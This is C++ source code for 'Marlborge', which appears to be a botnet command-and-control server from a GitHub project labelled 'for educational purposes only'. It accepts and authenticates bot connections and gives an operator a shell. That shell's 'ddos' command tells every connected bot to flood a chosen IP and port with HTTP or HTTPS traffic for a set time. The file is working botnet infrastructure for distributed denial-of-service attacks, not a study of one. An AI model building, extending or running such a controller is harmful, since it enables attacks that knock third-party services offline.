#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <iostream>
#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <thread>
#include <mutex>
#include <map>
#include <time.h>
#include <string>
#include <csignal>
#include <vector>

enum COMMAND {
	HELP = 0x01,
	DDOS = 0x02,
	CLIENTS = 0x03,
	LIST = 0x04,
	CLEAR = 0x0F,
	EXIT = 0xFF,
	UNKNOWN = 0x00
};

enum DDOS_METHOD {
	HTTP = 0x40,
	HTTPS = 0x41,
	UNKNOWN_METHOD = 0x00
};

void ListenThread();
void ClientThread(SOCKET sock, std::string ip);
void Disconnect(std::string ip);

void SIGINTHandler(int signal);

std::vector<std::string> split(std::string sData, char delimiter);

DDOS_METHOD TranslateMethod(std::string method);
COMMAND TranslateCommand(std::string cmd);

std::string GenRandStr(int nLength);

std::map<std::string, SOCKET> clients;
std::mutex clientsMutex;

#define IP_ADDR "127.0.0.1"
#define PORT 5000
#define MAXCONN 1200

#define AUTH 0x01
#define ATTACK 0x02
#define DISCONNECT 0x10
#define SUCCESS 0x0F
#define TIMEOUT 0x11

int main() {
	WSADATA wsa;
	int nRes = WSAStartup(MAKEWORD(2, 2), &wsa);

	if (nRes != 0) {
		std::cout << "[ERROR] An error occurred during WSAStartup." << std::endl;
		throw std::exception();
		return 1;
	}

	std::thread listenThread(ListenThread);
	listenThread.detach();
	
	std::cout <<
		"  __  __            _ _                          \n"
		" |  \\/  |          | | |                         \n"
		" | \\  / | __ _ _ __| | |__   ___  _ __ __ _  ___ \n"
		" | |\\/| |/ _` | '__| | '_ \\ / _ \\| '__/ _` |/ _ \\ \n"
		" | |  | | (_| | |  | | |_) | (_) | | | (_| |  __/\n"
		" |_|  |_|\\__,_|_|  |_|_.__/ \\___/|_|  \\__, |\\___|\n"
		"                                       __/ |     \n"
		"                                      |___/      \n\n";

	std::cout << "Welcome to Marlborge" << std::endl;
	std::cout << "Made for educational purposes only" << std::endl;
	std::cout << std::endl << "Github: https://github.com/PR3C14D0/Marlborge" << std::endl;
	std::cout << std::endl << "Type `help` for displaying all the commands" << std::endl;

	std::signal(SIGINT, SIGINTHandler);

	while (true) {
		std::cout << "root@marlborge:~# ";
		std::string cmd;
		std::getline(std::cin, cmd);
		std::cout << std::endl;

		COMMAND command = TranslateCommand(cmd);

		UINT nClientCount = clients.size();
		switch (command) {
		case HELP:
			std::cout << "Marlborge command list:\n"
				"1.- ddos {ip} {port} {method} {time}\n"
				"2.- clients\n"
				"3.- exit\n";
			break;
		case CLIENTS:
			std::cout << "Connected clients: " << nClientCount << std::endl;
			break;
		case DDOS:
		{
			/* DDOS STAGE */
			std::vector<std::string> splittedCmd = split(cmd, ' ');
			std::string ip = splittedCmd[1];
			std::string sPort = splittedCmd[2];
			std::string sMethod = splittedCmd[3];
			DDOS_METHOD method = TranslateMethod(sMethod);
			std::string sTime = splittedCmd[4];

			UINT nPort = stoi(sPort);
			UINT nTime = stoi(sTime);
			UINT nIPLength = ip.size();

			UINT nBufferSize = 0;

			char buffer[1024];
			buffer[nBufferSize] = ATTACK;
			nBufferSize++;
			buffer[nBufferSize] = nIPLength;
			nBufferSize++;
			memcpy(&buffer[nBufferSize], ip.data(), nIPLength);
			nBufferSize += nIPLength;
			buffer[nBufferSize] = nPort;
			nBufferSize++;
			buffer[nBufferSize] = method;
			nBufferSize++;
			/* Last 4 bytes will be for the time. */
			UINT unTime = ntohl(nTime);
			UCHAR* chTime = (UCHAR*)&unTime;
			for (int i = 0; i < sizeof(UINT); i++) {
				buffer[nBufferSize] = (UINT)chTime[i];
				nBufferSize++;
			}

			for (std::pair<std::string, SOCKET> client : clients) {
				send(client.second, buffer, nBufferSize, 0);
			}
		}
			break;
		case LIST:
		{
			std::string outputStr;
			for (std::pair<std::string, SOCKET> client : clients) {
				outputStr.append(client.first + "\n");
			}

			std::cout << outputStr << std::endl;
		}
			break;
		case CLEAR:
			std::cout << "\033[2J\033[1;1H" << std::endl;
			break;
		case EXIT:
			for (std::pair<std::string, SOCKET> client : clients) {
				Disconnect(client.first);
			}
			break;
		default:
			std::cout << "[ERROR] " << cmd << " is not a valid command" << std::endl;
			break;
		}
	}

	return 0;
}

void ListenThread() {
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (sock == INVALID_SOCKET) {
		std::cout << "[ERROR] An error occurred with our server socket initialization" << std::endl;
		throw std::exception();
		return;
	}

	SOCKADDR_IN saIn = { };
	saIn.sin_family = AF_INET;
	saIn.sin_port = htons(PORT);
	inet_pton(AF_INET, IP_ADDR, &saIn.sin_addr.s_addr);

	int nRes = bind(sock, (SOCKADDR*)&saIn, sizeof(saIn));
	if (nRes == SOCKET_ERROR) {
		std::cout << "[ERROR] Error binding our server socket." << std::endl;
		throw std::exception();
		return;
	}
	
	nRes = listen(sock, MAXCONN);

	if (nRes == SOCKET_ERROR) {
		std::cout << "[ERROR] Error listening on our server socket." << std::endl;
		throw std::exception();
		return;
	}

	bool bQuit = false;
	while (!bQuit) {
		SOCKADDR_IN clientInfo;
		int clientInfoSize = sizeof(clientInfo);
		SOCKET client = accept(sock, (SOCKADDR*)&clientInfo, &clientInfoSize);
		char chIpBuff[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &clientInfo.sin_addr.s_addr, chIpBuff, INET_ADDRSTRLEN);

		std::string clientIp(chIpBuff);

		clientsMutex.lock();
		clients[clientIp] = client;
		clientsMutex.unlock();

		std::thread clientThread(ClientThread, client, clientIp);
		clientThread.detach();
	}
}

std::string GenRandStr(int nLength) {
	const std::string alphaNum =
		"0123456789"
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";

	std::string randStr;
	std::srand(time(nullptr));
	for (int i = 0; i < nLength; i++) {
		int nRandNum = rand() % (sizeof(alphaNum) - 1);
		randStr += alphaNum[nRandNum];
	}

	return randStr;
}

COMMAND TranslateCommand(std::string cmd) {
	COMMAND command = COMMAND::UNKNOWN;
	cmd = split(cmd, ' ')[0];
	if (cmd == "help")
		command = HELP;

	if (cmd == "ddos")
		command = DDOS;

	if (cmd == "clients")
		command = CLIENTS;

	if (cmd == "list")
		command = LIST;

	if (cmd == "clear")
		command = CLEAR;

	if (cmd == "exit")
		command = EXIT;

	return command;
}

DDOS_METHOD TranslateMethod(std::string method) {
	DDOS_METHOD ddos_method = DDOS_METHOD::UNKNOWN_METHOD;

	if (method == "http")
		ddos_method = DDOS_METHOD::HTTP;

	if (method == "https")
		ddos_method = DDOS_METHOD::HTTPS;

	return ddos_method;
}

void ClientThread(SOCKET sock, std::string ip) {
	/* AUTHENTICATION STAGE */
	char auth[1];
	recv(sock, auth, sizeof(auth), 0);

	if (auth[0] == AUTH) {
		std::string code = GenRandStr(16);
		char authBuff[1024];
		int nBuffSize = 0;
		authBuff[nBuffSize] = AUTH;
		nBuffSize++;
		memcpy(&authBuff[nBuffSize], code.data(), code.size());
		nBuffSize += code.size();
		send(sock, authBuff, nBuffSize, 0);

		char respBuff[1024];
		int nRespSize = recv(sock, respBuff, sizeof(respBuff), 0);
		if (respBuff[0] != 0x01) 
			Disconnect(ip);

		std::string respCode;
		respCode.append(&respBuff[1], code.size());

		if (respCode != code)
			Disconnect(ip);
		else {
			char success[] = { SUCCESS };
			send(sock, success, sizeof(success), 0);
		}
	}

	bool bConnected = true;
	while (bConnected) {
		char buffer[1];
		recv(sock, buffer, sizeof(buffer), 0);

		/* DISCONNECT STAGE */
		if ((UINT)buffer[0] == DISCONNECT) {
			Disconnect(ip);
			bConnected = false;
		}
	}

	return;
}

void Disconnect(std::string ip) {
	char quit[] = { DISCONNECT };
	SOCKET sock = clients[ip];
	send(sock, quit, sizeof(quit), 0);
	clientsMutex.lock();
	clients.erase(ip);
	closesocket(sock);
	clientsMutex.unlock();
	return;
}

std::vector<std::string> split(std::string sData, char delimiter) {
	std::vector<std::string> retStr;
	std::string actualStr;
	for (char c : sData) {
		if (c != delimiter) 
			actualStr += c;
		else {
			retStr.push_back(actualStr);
			actualStr = "";
		}
	}
	if (!actualStr.empty())
		retStr.push_back(actualStr);

	return retStr;
}

void SIGINTHandler(int signal) {
	
}